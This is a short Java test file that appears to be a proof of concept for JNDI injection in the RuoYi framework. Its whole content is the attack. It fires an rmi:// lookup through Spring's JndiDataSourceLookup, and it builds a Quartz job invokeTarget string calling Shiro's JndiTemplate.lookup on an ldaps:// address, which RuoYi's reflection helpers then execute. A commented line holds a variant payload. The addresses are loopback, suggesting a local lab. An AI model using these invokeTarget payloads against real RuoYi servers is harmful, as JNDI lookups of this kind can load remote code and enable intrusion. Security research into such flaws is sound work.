```java
package com.ruoyi;

import org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup;
import java.util.List;
import static com.ruoyi.quartz.util.JobInvokeUtil.*;

public class Test {
    public static void main(String[] args) throws Exception {
        
        JndiDataSourceLookup jndiDataSourceLookup = new JndiDataSourceLookup();
        jndiDataSourceLookup.getDataSource("rmi://127.0.0.1/123:1099");
        String invokeTarget = "org.apache.shiro.jndi.JndiTemplate.lookup('ldaps://127.0.0.1:1099')";
        //org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup.getDataSource('rmi:@//127.0.0.1/123')
        String beanName = getBeanName(invokeTarget);
        String methodName = getMethodName(invokeTarget);
        List<Object[]> methodParams = getMethodParams(invokeTarget);
        Object bean = Class.forName(beanName).newInstance();
       invokeMethod(bean, methodName, methodParams);
       
    }
}

```

